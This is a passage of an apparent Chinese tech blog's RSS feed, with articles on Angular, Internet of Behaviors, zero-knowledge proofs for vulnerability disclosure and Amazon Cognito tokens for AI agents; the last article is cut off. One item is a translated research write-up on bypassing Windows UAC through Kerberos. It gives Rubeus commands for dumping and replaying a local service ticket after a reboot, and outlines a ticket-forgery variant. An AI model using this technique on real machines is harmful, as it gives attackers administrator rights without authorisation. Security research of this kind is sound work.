&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;clone&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;setHeaders&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Authorization&lt;/span&gt;: &lt;span class=&#34;kt&#34;&gt;authToken&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;q-15-什么是服务端渲染&#34;&gt;Q-15. 什么是服务端渲染？
&lt;/h2&gt;&lt;p&gt;解决大型应用加载慢的问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务端返回完整渲染页面&lt;/li&gt;
&lt;li&gt;浏览器接管后续交互&lt;/li&gt;
&lt;li&gt;提升首屏加载性能&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;掌握这些核心知识将助你在Angular面试中脱颖而出。除了技术问题，别忘了准备开发者所需的软技能。如有疑问，欢迎在评论区提出。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>以最复杂方式绕过UAC：Kerberos协议漏洞利用详解</title>
        <link>http://localhost:1313/p/%E4%BB%A5%E6%9C%80%E5%A4%8D%E6%9D%82%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87uackerberos%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/</link>
        <pubDate>Fri, 01 Aug 2025 23:30:05 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BB%A5%E6%9C%80%E5%A4%8D%E6%9D%82%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87uackerberos%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/</guid>
        <description>&lt;h1 id=&#34;以最复杂方式绕过uac&#34;&gt;以最复杂方式绕过UAC
&lt;/h1&gt;&lt;p&gt;虽然我不常研究这个，但发现新的UAC绕过方法总是很有趣。在阅读Rubeus工具的功能时，我意识到可以滥用Kerberos协议绕过UAC——至少在域加入系统中可行。不清楚之前是否有人记录过这种方法，有篇帖子讨论过类似技术但需要从其他系统发起攻击，而本文将描述本地实现的方案。&lt;/p&gt;
&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
&lt;/h2&gt;&lt;p&gt;系统默认会通过LSASS过滤网络身份验证令牌，移除本地管理员的权限。但存在关键例外：如果用户是域用户兼本地管理员，LSASS会允许网络认证使用完整管理员令牌。这在通过Kerberos进行本地认证时会产生问题——难道这不是简单的UAC绕过吗？&lt;/p&gt;
&lt;p&gt;实际上Kerberos有专门机制阻止这种攻击。去年我阅读了微软工程师Steve Syfuhs关于Kerberos如何防止本地UAC绕过的文章。简而言之：当用户请求服务票据时，LSASS会在TGS-REQ请求中嵌入本地安全信息，这些信息会被编码到生成的票据中。当该票据用于本地系统认证时，Kerberos会提取这些信息进行验证。&lt;/p&gt;
&lt;p&gt;通过分析Kerberos票据，我们发现两个关键字段：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Authorization&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Data&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;KERB_AD_RESTRICTION_ENTRY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Flags&lt;/span&gt;           &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LimitedToken&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Integrity&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Level&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Medium&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Machine&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;      &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;6640665F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Authorization&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Data&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;KERB_LOCAL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Security&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;60CE03337E01000025FC763900000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;核心绕过机制&#34;&gt;核心绕过机制
&lt;/h2&gt;&lt;p&gt;LSASS通过&lt;code&gt;LsaISetSupplementalTokenInfo&lt;/code&gt;函数处理这些字段，主要检查包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;比较票据中的MachineID与LSASS内存中的值&lt;/li&gt;
&lt;li&gt;检查未公开的LSA网络令牌过滤标志&lt;/li&gt;
&lt;li&gt;验证用户SID是否属于本地账户域&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;当满足以下任一条件时过滤将失效：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户SID不属于本地账户域&lt;/li&gt;
&lt;li&gt;LocalAccountTokenFilterPolicy策略非零&lt;/li&gt;
&lt;li&gt;系统是域控制器(NtProductLanManNt)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;两种具体利用方法&#34;&gt;两种具体利用方法
&lt;/h2&gt;&lt;h3 id=&#34;方法一票据重用攻击&#34;&gt;方法一：票据重用攻击
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;获取本地系统的服务票据并保存&lt;/li&gt;
&lt;li&gt;重启系统使LSASS重新初始化&lt;/li&gt;
&lt;li&gt;重新加载旧票据，此时MachineID不匹配导致过滤失效&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;klist&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$env:COMPUTERNAME&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Rubeus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$env:COMPUTERNAME&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nowrap&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 保存Base64票据后重启&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Rubeus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ptt&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ticket&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BASE64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TICKET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;方法二票据伪造攻击&#34;&gt;方法二：票据伪造攻击
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;利用Benjamin Delpy在kekeo中发现的非约束委派漏洞获取本地TGT&lt;/li&gt;
&lt;li&gt;向KDC请求新的本地服务票据，填充伪造的MachineID&lt;/li&gt;
&lt;li&gt;将伪造票据导入缓存实现UAC绕过&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;kerb-local的奥秘&#34;&gt;KERB-LOCAL的奥秘
&lt;/h2&gt;&lt;p&gt;这个字段设计用于凭证重用，但实际使用频率很低，因为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;仅当服务端使用Negotiate包时有效&lt;/li&gt;
&lt;li&gt;本地Negotiate认证默认会选择NTLM协议&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有趣的是，KERB-LOCAL中的值实际是LSASS堆中KERB_CREDENTIAL结构的地址和票据计数。虽然Kerberos会验证PAC中的SID匹配性，但这种实现方式可能存在安全隐患。&lt;/p&gt;
&lt;p&gt;[更新] 文末提供了修改Win32 SCM API以强制使用Kerberos本地认证的C++代码示例。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>行为互联网(IoB)核心技术解析与应用前景</title>
        <link>http://localhost:1313/p/%E8%A1%8C%E4%B8%BA%E4%BA%92%E8%81%94%E7%BD%91iob%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E5%89%8D%E6%99%AF/</link>
        <pubDate>Fri, 01 Aug 2025 23:22:50 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%A1%8C%E4%B8%BA%E4%BA%92%E8%81%94%E7%BD%91iob%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E5%89%8D%E6%99%AF/</guid>
        <description>&lt;h1 id=&#34;行为互联网iob核心技术解析与应用前景&#34;&gt;行为互联网(IoB)核心技术解析与应用前景
&lt;/h1&gt;&lt;h2 id=&#34;iob技术定义&#34;&gt;IoB技术定义
&lt;/h2&gt;&lt;p&gt;IoB(行为互联网)概念由赫尔辛基大学心理学教授Göte Nyman于2012年提出，是物联网(IoT)技术的延伸发展。其核心技术架构包含三个关键组件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;数据采集层&lt;/strong&gt;：通过IoT设备、可穿戴设备、社交平台等多源渠道获取用户行为数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分析引擎&lt;/strong&gt;：运用行为心理学模型和机器学习算法解析数据模式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;应用接口&lt;/strong&gt;：将分析结果转化为可操作的商业智能或个性化服务&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;核心技术实现&#34;&gt;核心技术实现
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;设备编址体系&lt;/strong&gt;：为每个行为分配唯一标识符(类似IP地址)，实现多源数据关联&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实时处理框架&lt;/strong&gt;：支持流式数据处理和行为预测模型更新&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;跨域数据融合&lt;/strong&gt;：整合生物特征数据(心率/步数)、消费记录、社交互动等多模态信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;行业应用案例&#34;&gt;行业应用案例
&lt;/h2&gt;&lt;h3 id=&#34;保险科技&#34;&gt;保险科技
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;驾驶行为分析SDK集成到车载系统&lt;/li&gt;
&lt;li&gt;事故场景重建算法(基于加速度计/GPS数据)&lt;/li&gt;
&lt;li&gt;动态保费定价模型&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数字营销&#34;&gt;数字营销
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;用户兴趣图谱构建技术&lt;/li&gt;
&lt;li&gt;实时推荐引擎架构&lt;/li&gt;
&lt;li&gt;上下文广告投放系统(如Google Ads的IoB实现)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;医疗健康&#34;&gt;医疗健康
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;可穿戴设备数据聚合平台&lt;/li&gt;
&lt;li&gt;术后康复监测算法&lt;/li&gt;
&lt;li&gt;用药依从性分析模型&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术挑战&#34;&gt;技术挑战
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;隐私保护&lt;/strong&gt;：差分隐私、联邦学习等数据脱敏技术&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全防护&lt;/strong&gt;：端到端加密传输、行为数据防篡改机制&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;系统集成&lt;/strong&gt;：异构设备协议转换中间件开发&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;开发者技能栈&#34;&gt;开发者技能栈
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;核心语言：Python(数据分析)、JavaScript(前端可视化)&lt;/li&gt;
&lt;li&gt;专业领域：传感器开发、行为模式识别算法&lt;/li&gt;
&lt;li&gt;工具链：Apache Kafka(实时流处理)、TensorFlow(行为预测模型)&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Gartner预测到2025年全球过半人口将至少与1个IoB系统交互。该领域需要大量具备物联网架构设计、行为数据分析能力的复合型技术人才。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>用零知识证明重塑漏洞披露机制 - 突破性技术解析</title>
        <link>http://localhost:1313/p/%E7%94%A8%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E%E9%87%8D%E5%A1%91%E6%BC%8F%E6%B4%9E%E6%8A%AB%E9%9C%B2%E6%9C%BA%E5%88%B6-%E7%AA%81%E7%A0%B4%E6%80%A7%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Fri, 01 Aug 2025 23:16:03 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%94%A8%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E%E9%87%8D%E5%A1%91%E6%BC%8F%E6%B4%9E%E6%8A%AB%E9%9C%B2%E6%9C%BA%E5%88%B6-%E7%AA%81%E7%A0%B4%E6%80%A7%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;用零知识证明重塑漏洞披露机制&#34;&gt;用零知识证明重塑漏洞披露机制
&lt;/h1&gt;&lt;p&gt;我们与约翰霍普金斯大学的合作伙伴Matthew Green正在利用零知识证明（ZK）技术建立一个可信环境，使科技公司与漏洞研究者能够安全沟通而不必担心破坏或纠纷。这项为期四年的研究将推动ZK证明从理论走向实践，为研究者提供能生成漏洞可利用性ZK证明的软件工具。该研究隶属于DARPA&amp;quot;加密验证与评估信息保护&amp;quot;（SIEVE）计划。&lt;/p&gt;
&lt;h2 id=&#34;为什么需要漏洞可利用性的zk证明&#34;&gt;为什么需要漏洞可利用性的ZK证明？
&lt;/h2&gt;&lt;p&gt;软件厂商与漏洞研究者之间常因漏洞报告产生矛盾。研究者过度披露漏洞细节可能丧失奖励，而过早披露则可能损害企业声誉。更严重的是，当企业忽视安全团队警告时，研究者面临两难选择：保持沉默让用户处于风险，或公开漏洞迫使企业行动——后者可能反而帮助攻击者。&lt;/p&gt;
&lt;p&gt;ZK证明将彻底改变这种局面，允许企业明确定义漏洞赏金范围，研究者则能无可辩驳地证明其拥有有效漏洞利用方案，同时避免公开披露风险。&lt;/p&gt;
&lt;h2 id=&#34;zk证明的设计原理&#34;&gt;ZK证明的设计原理
&lt;/h2&gt;&lt;p&gt;在ZK证明中，证明者无需透露具体信息即可验证陈述真实性。例如证明知道SHA256原像而不泄露原像本身。目前最著名的工业应用是Zcash等隐私区块链，用户通过ZK证明交易合法性而不暴露任何敏感信息。&lt;/p&gt;
&lt;p&gt;开发高效ZK系统需权衡三个指标：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;证明生成时间&lt;/li&gt;
&lt;li&gt;验证时间&lt;/li&gt;
&lt;li&gt;通信带宽（证明数据量）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;核心挑战在于将待证明陈述转换为无循环的布尔/算术电路。这对缺乏明确数学表述的问题尤为困难，例如包含数据依赖循环的程序必须展开处理。&lt;/p&gt;
&lt;h2 id=&#34;漏洞可利用性证明技术实现&#34;&gt;漏洞可利用性证明技术实现
&lt;/h2&gt;&lt;p&gt;由于ZK证明接受布尔电路表述，我们需要构建仅在漏洞利用成功时返回&amp;quot;真&amp;quot;的电路。关键挑战包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;处理器建模&lt;/strong&gt;：需精确模拟目标程序的编译架构。初始方案是对处理器单步运行建模，但会导致电路规模爆炸（50MB内存的100条指令轨迹将产生5GB电路）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;内存验证优化&lt;/strong&gt;：采用SNARKs for C的方案，将证明分为核心逻辑与内存正确性两部分。逻辑验证通过检查指令序列状态转移实现，内存验证则通过内存排序轨迹的线性扫描完成，避免直接处理整个RAM。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;防伪造机制&lt;/strong&gt;：通过&amp;quot;置换检查器&amp;quot;电路确保内存排序轨迹的真实性。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;x86架构的特殊挑战&#34;&gt;x86架构的特殊挑战
&lt;/h2&gt;&lt;p&gt;从简易的MSP430 RISC架构转向复杂x86架构面临巨大挑战：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RISC处理器每周期约1-10k逻辑门&lt;/li&gt;
&lt;li&gt;基础x86模型处理10,000条指令可能产生48GB证明数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们的解决方案是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;动态子集生成&lt;/strong&gt;：通过程序分析确定二进制文件实际使用的x86指令子集（通常仅数百条）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;静态二进制转换&lt;/strong&gt;：对repz等运行时依赖指令，转换为可验证的子集指令&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;组合电路优化&lt;/strong&gt;：避免硬编码复杂指令处理逻辑&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;漏洞披露新范式&#34;&gt;漏洞披露新范式
&lt;/h2&gt;&lt;p&gt;这项技术将实现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;企业精确定义漏洞赏金范围&lt;/li&gt;
&lt;li&gt;研究者安全提交漏洞证明&lt;/li&gt;
&lt;li&gt;消费者保护机制：研究者可警示风险而不公开漏洞细节&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们正推动ZK证明从学术走向工业应用。如果您有特殊应用场景，欢迎联系我们——我们在ZK证明方案和电路编译器领域拥有丰富经验。&lt;/p&gt;
&lt;p&gt;（原文包含技术架构图表示例和论文引用，此处保留技术要点翻译）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>利用Amazon Cognito为AI代理赋予用户上下文权限的技术解析</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8amazon-cognito%E4%B8%BAai%E4%BB%A3%E7%90%86%E8%B5%8B%E4%BA%88%E7%94%A8%E6%88%B7%E4%B8%8A%E4%B8%8B%E6%96%87%E6%9D%83%E9%99%90%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Fri, 01 Aug 2025 23:09:07 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8amazon-cognito%E4%B8%BAai%E4%BB%A3%E7%90%86%E8%B5%8B%E4%BA%88%E7%94%A8%E6%88%B7%E4%B8%8A%E4%B8%8B%E6%96%87%E6%9D%83%E9%99%90%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;img src="https://i.imgs.ovh/2025/08/01/HNnbm.png" alt="Featured image of post 利用Amazon Cognito为AI代理赋予用户上下文权限的技术解析" /&gt;&lt;h1 id=&#34;利用amazon-cognito为ai代理赋予用户上下文权限&#34;&gt;利用Amazon Cognito为AI代理赋予用户上下文权限
&lt;/h1&gt;&lt;p&gt;Amazon Cognito是一项托管的客户身份和访问管理（CIAM）服务，可为Web和移动应用程序提供无缝的用户注册和登录功能。通过用户池，Amazon Cognito提供了具有强大身份验证功能的用户目录，包括密码、与外部身份提供商（IdP）的联合以及用于安全机器对机器（M2M）授权的OAuth 2.0流。&lt;/p&gt;
&lt;p&gt;Amazon Cognito颁发标准的JSON Web令牌（JWT），并支持使用预令牌生成Lambda触发器自定义身份和访问令牌以进行用户身份验证。Amazon Cognito扩展了令牌定制功能，支持M2M的访问令牌定制以及在M2M授权期间从客户端传递元数据的能力。应用程序构建者可以利用这两个功能来支持多种用例，包括基于唯一运行时策略、权限、环境或传递的元数据定制访问令牌。这可以简化和丰富M2M身份验证和授权场景，并为新兴用例（如AI代理的身份和访问管理）开辟新的可能性。&lt;/p&gt;
&lt;h2 id=&#34;解决方案概述和参考架构&#34;&gt;解决方案概述和参考架构
&lt;/h2&gt;&lt;p&gt;在一个示例架构中（图1），用户通过Amazon Cognito用户池登录到Web或移动应用程序，并将令牌返回给客户端。在这里，应用程序可以是一个使用Amazon Bedrock代理的无服务器数字助手，需要收集和处理驻留在第三方跨域服务中的数据。AI代理通过执行OAuth 2.0客户端凭证授权来获取自己的访问令牌，同时使用&lt;code&gt;aws_client_metadata&lt;/code&gt;请求参数传递用户的访问令牌作为上下文。AI代理接收用户上下文化的访问令牌，并调用一个信任Amazon Cognito用户池颁发者与受众的外部、第三方或跨域服务。跨域服务可以获取JSON Web密钥集（JWKS）以验证令牌并提取表示AI代理和底层用户的声明。授权在跨域服务中使用定制访问令牌的声明进行，对于细粒度授权，使用Amazon Verified Permissions。&lt;/p&gt;
&lt;h2 id=&#34;实现细节&#34;&gt;实现细节
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;AI代理获取OAuth 2.0访问令牌&lt;/strong&gt;&lt;br&gt;
AI代理使用Amazon Bedrock代理，配置为使用Lambda的自定义编排。当应用程序与Amazon Bedrock代理交互时，自定义编排器将用户的访问令牌传递给Lambda函数作为自定义编排的一部分。Lambda函数验证用户的令牌以确保其未过期且未被篡改。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Amazon Cognito预令牌生成Lambda触发器&lt;/strong&gt;&lt;br&gt;
在AI代理使用有效的客户端ID和密钥调用Amazon Cognito的&lt;code&gt;/token&lt;/code&gt;端点后，Cognito调用预令牌生成Lambda触发器。Lambda函数验证用户的访问令牌，并定制返回给AI代理的访问令牌。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;跨域资源服务器授权检查&lt;/strong&gt;&lt;br&gt;
